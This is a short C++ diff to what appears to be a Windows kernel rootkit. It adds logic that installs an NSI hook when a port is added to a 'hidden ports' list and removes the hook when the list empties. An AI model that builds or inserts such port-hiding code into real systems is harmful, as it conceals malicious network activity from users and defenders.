@@ -286,6 +286,15 @@ bool NetworkUtils::AddHiddenPort(HiddenPort port) {
 				this->HiddenPortsList.LastIndex = i;
 
 			this->HiddenPortsList.PortsCount++;
+
+			if (!this->CallbackActivated) {
+				NTSTATUS status = this->InstallNsiHook();
+
+				if (!NT_SUCCESS(status)) {
+					this->RemoveHiddenPort(port);
+					break;
+				}
+			}
 			return true;
 		}
 	return false;
@@ -319,6 +328,10 @@ bool NetworkUtils::RemoveHiddenPort(HiddenPort port) {
 					this->HiddenPortsList.LastIndex = newLastIndex;
 				this->HiddenPortsList.Ports[i].Port = 0;
 				this->HiddenPortsList.PortsCount--;
+
+				if (this->GetPortsCount() == 0 && this->CallbackActivated) {
+					this->UninstallNsiHook();
+				}
 				return true;
 			}
 			else
